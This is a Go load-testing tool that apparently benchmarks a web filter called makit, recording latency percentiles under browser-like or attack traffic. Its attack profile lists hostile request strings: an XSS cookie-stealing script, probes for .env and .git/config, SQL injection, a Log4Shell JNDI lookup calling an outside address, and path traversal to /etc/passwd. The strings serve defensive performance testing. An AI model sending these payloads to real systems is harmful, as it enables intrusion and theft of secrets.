// load is the HTTP load generator of makit's benchmarks: fixed concurrency, keep-alive connections, latency
// percentiles from every request (no sampling). No dependencies, so anyone can read what it measures.
//
//	load run -name edge -url http://makit:8080/ -c 32 -d 15s [-profile browser|attack] [-spread 100000] [-baseline direct]
//	load wait URL…                 wait until each URL answers
//	load gen-list N                N public IPv4 addresses, one per line (for a big block list)
//	load report results.jsonl      markdown table
package main

import (
	"bufio"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand/v2"
	"net"
	"net/http"
	"os"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type Result struct {
	Name     string         `json:"name"`
	Baseline string         `json:"baseline,omitempty"`
	URL      string         `json:"url"`
	Profile  string         `json:"profile"`
	Conc     int            `json:"concurrency"`
	Seconds  float64        `json:"seconds"`
	Requests int            `json:"requests"`
	RPS      float64        `json:"rps"`
	P50      float64        `json:"p50_ms"`
	P90      float64        `json:"p90_ms"`
	P99      float64        `json:"p99_ms"`
	P999     float64        `json:"p999_ms"`
	Max      float64        `json:"max_ms"`
	Errors   int64          `json:"errors"`
	Status   map[string]int `json:"status"`
}

const chromeUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

var pages = []string{"/", "/blog/how-to-harden-ssh", "/blog/docker-and-ufw?ref=home", "/docs/install", "/pricing",
	"/assets/app.3f9c1.js", "/assets/style.81ac2.css", "/img/logo.svg", "/api/posts?page=2&limit=20", "/about"}

var attacks = []string{"/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", "/.env", "/.git/config",
	"/index.php?id=1%27%20OR%20%271%27=%271", "/?x=${jndi:ldap://203.0.113.1/a}", "/static/..%2f..%2f..%2fetc/passwd"}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "load run|wait|gen-list|report")
		os.Exit(2)
	}
	switch os.Args[1] {
	case "run":
		run(os.Args[2:])
	case "wait":
		wait(os.Args[2:])
	case "gen-list":
		genList(os.Args[2:])
	case "report":
		report(os.Args[2:])
	default:
		fmt.Fprintln(os.Stderr, "load run|wait|gen-list|report")
		os.Exit(2)
	}
}

func run(args []string) {
	fs := flag.NewFlagSet("run", flag.ExitOnError)
	name := fs.String("name", "target", "name in the report")
	baseline := fs.String("baseline", "", "name of the run this one is compared with")
	url := fs.String("url", "", "target base URL")
	conc := fs.Int("c", 32, "concurrent connections")
	dur := fs.Duration("d", 15*time.Second, "measured duration")
	warm := fs.Duration("warmup", 3*time.Second, "unmeasured warm-up")
	profile := fs.String("profile", "browser", "browser: real-browser requests; attack: XSS, probes, injections")
	spread := fs.Int("spread", 100000, "distinct visitor IPs sent as X-Forwarded-For (0: none)")
	out := fs.String("out", "", "append the JSON result to this file")
	fs.Parse(args)
	tr := &http.Transport{MaxIdleConns: *conc * 2, MaxIdleConnsPerHost: *conc * 2, DisableCompression: true,
		DialContext: (&net.Dialer{Timeout: 5 * time.Second, KeepAlive: 30 * time.Second}).DialContext}
	cl := &http.Client{Transport: tr, Timeout: 10 * time.Second,
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	base := strings.TrimSuffix(*url, "/")
	var measuring atomic.Bool
	var errs atomic.Int64
	lat := make([][]time.Duration, *conc)
	status := make([]map[int]int, *conc)
	ctx, cancel := context.WithTimeout(context.Background(), *warm+*dur)
	defer cancel()
	time.AfterFunc(*warm, func() { measuring.Store(true) })
	var wg sync.WaitGroup
	for w := 0; w < *conc; w++ {
		wg.Add(1)
		go func(w int) {
			defer wg.Done()
			rng := rand.New(rand.NewPCG(uint64(w)+1, 7))
			lat[w] = make([]time.Duration, 0, 1<<16)
			status[w] = map[int]int{}
			for ctx.Err() == nil {
				path := pages[rng.IntN(len(pages))]
				if *profile == "attack" {
					path = attacks[rng.IntN(len(attacks))]
				}
				req, _ := http.NewRequestWithContext(ctx, "GET", base+path, nil)
				req.Header.Set("User-Agent", chromeUA)
				req.Header.Set("Accept", "text/html,application/xhtml+xml,*/*;q=0.8")
				req.Header.Set("Accept-Language", "vi-VN,vi;q=0.9,en;q=0.8")
				req.Header.Set("Accept-Encoding", "gzip, br")
				req.Header.Set("Sec-Ch-Ua", `"Chromium";v="126", "Google Chrome";v="126"`)
				req.Header.Set("Sec-Fetch-Mode", "navigate")
				req.Header.Set("Referer", base+"/")
				if *spread > 0 {
					i := rng.IntN(*spread)
					req.Header.Set("X-Forwarded-For", fmt.Sprintf("100.%d.%d.%d", 64+(i>>16)&63, (i>>8)&255, i&255))
				}
				start := time.Now()
				res, err := cl.Do(req)
				if err == nil {
					_, _ = io.Copy(io.Discard, res.Body)
					res.Body.Close()
				}
				d := time.Since(start)
				if !measuring.Load() || ctx.Err() != nil {
					continue
				}
				if err != nil {
					errs.Add(1)
					continue
				}
				lat[w] = append(lat[w], d)
				status[w][res.StatusCode]++
			}
		}(w)
	}
	wg.Wait()
	var all []time.Duration
	st := map[string]int{}
	for w := range lat {
		all = append(all, lat[w]...)
		for c, n := range status[w] {
			st[fmt.Sprint(c)] += n
		}
	}
	sort.Slice(all, func(i, j int) bool { return all[i] < all[j] })
	pct := func(p float64) float64 {
		if len(all) == 0 {
			return 0
		}
		return float64(all[min(len(all)-1, int(p*float64(len(all))))].Microseconds()) / 1000
	}
	r := Result{Name: *name, Baseline: *baseline, URL: *url, Profile: *profile, Conc: *conc, Seconds: dur.Seconds(),
		Requests: len(all), RPS: float64(len(all)) / dur.Seconds(), P50: pct(.50), P90: pct(.90), P99: pct(.99),
		P999: pct(.999), Errors: errs.Load(), Status: st}
	if len(all) > 0 {
		r.Max = float64(all[len(all)-1].Microseconds()) / 1000
	}
	b, _ := json.Marshal(r)
	fmt.Println(string(b))
	if *out != "" {
		f, err := os.OpenFile(*out, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o644)
		if err == nil {
			f.Write(append(b, '\n'))
			f.Close()
		}
	}
}

func wait(urls []string) {
	deadline := time.Now().Add(90 * time.Second)
	for _, u := range urls {
		for {
			res, err := http.Get(u)
			if err == nil {
				res.Body.Close()
				break
			}
			if time.Now().After(deadline) {
				fmt.Fprintln(os.Stderr, "not ready:", u, err)
				os.Exit(1)
			}
			time.Sleep(500 * time.Millisecond)
		}
	}
}

func genList(args []string) {
	n := 1000000
	if len(args) > 0 {
		fmt.Sscan(args[0], &n)
	}
	w := bufio.NewWriterSize(os.Stdout, 1<<20)
	defer w.Flush()
	fmt.Fprintf(w, "# benchmark list: %d addresses in 11.0.0.0/8–14.0.0.0/8\n", n)
	for i := 0; i < n; i++ {
		fmt.Fprintf(w, "%d.%d.%d.%d\n", 11+(i>>24), (i>>16)&255, (i>>8)&255, i&255)
	}
}

func report(args []string) {
	f, err := os.Open(args[0])
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	defer f.Close()
	var rs []Result
	by := map[string]Result{}
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		var r Result
		if json.Unmarshal(sc.Bytes(), &r) == nil {
			rs = append(rs, r)
			by[r.Name] = r
		}
	}
	fmt.Println("| Run | Profile | req/s | p50 ms | p90 ms | p99 ms | p99.9 ms | added p50 / p99 | statuses | errors |")
	fmt.Println("| --- | --- | ---: | ---: | ---: | ---: | ---: | --- | --- | ---: |")
	for _, r := range rs {
		added := "baseline"
		if b, ok := by[r.Baseline]; ok && r.Baseline != "" {
			added = fmt.Sprintf("+%.2f / +%.2f ms vs %s", r.P50-b.P50, r.P99-b.P99, b.Name)
		}
		var st []string
		for c, n := range r.Status {
			st = append(st, fmt.Sprintf("%s×%d", c, n))
		}
		sort.Strings(st)
		fmt.Printf("| %s | %s | %.0f | %.2f | %.2f | %.2f | %.2f | %s | %s | %d |\n", r.Name, r.Profile, r.RPS, r.P50, r.P90,
			r.P99, r.P999, added, strings.Join(st, " "), r.Errors)
	}
}
